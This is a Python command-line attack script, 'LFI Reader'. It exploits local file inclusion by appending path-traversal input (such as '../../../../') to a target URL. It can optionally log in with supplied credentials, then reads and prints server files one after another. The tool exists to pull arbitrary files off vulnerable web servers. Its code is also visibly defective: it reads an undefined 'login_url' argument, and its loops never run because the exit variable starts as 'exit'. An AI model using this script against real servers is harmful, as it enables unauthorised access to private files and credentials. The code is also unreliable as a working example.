#!/usr/bin/env  python3


import argparse
import requests

banner="""
.____                 .___         .__          
|    |      ____    __| _/__  _  __|__|   ____  
|    |     /  _ \  / __ | \ \/ \/ /|  |  / ___\ 
|    |___ (  <_> )/ /_/ |  \     / |  | / /_/  >
|_______ \ \____/ \____ |   \/\_/  |__| \___  / 
        \/             \/              /_____/  
"""
print(banner)
print(f"[+] LFI Reader @hengkilodwig \n\n")

main_parser =argparse.ArgumentParser(add_help=False)
main_parser.add_argument("-l","--login", help="If the target using session.", default=None, required=False)
main_parser.add_argument("-u","--url", help="Please make sure the path of LFI was correct \n ex: http://domain.com/?page=../../../../", required=True,)
main_args, _ = main_parser.parse_known_args()


parser = argparse.ArgumentParser(parents=[main_parser])
if main_args.login :
    parser.add_argument('-c','--creds',  help='The Credential to post', required=main_args.login)

exit = "exit"
print("[+] type 'exit' to close the conenction")
try:
    args = parser.parse_args()
    s = requests.Session()
    if(args.login_url is None):
        while exit != "exit":
            file_to_check = input(f"[+] File to read >> ")
            if(file_to_check.strip().lower() == 'exit'):
                break
            r = s.get(args.url + file_to_check.strip()[1:])
            print(f"[+] Content of {file_to_check} \n {r.text}")
            exit = file_to_check
    else:
        s.get(args.login)
        s.post(args.login, data = args.creds)
        while exit != "exit":
            file_to_check = input(f"[+] File to read >> ")
            if(file_to_check.strip().lower() == 'exit'):
                break
            r = s.get(main_args.url + file_to_check.strip()[1:])
            print(f"[+] Content of {file_to_check} \n {r.text}")
            exit = file_to_check

except:
    print(f"[!] Some Error ...\n=> Please Check the parameter use -h for help")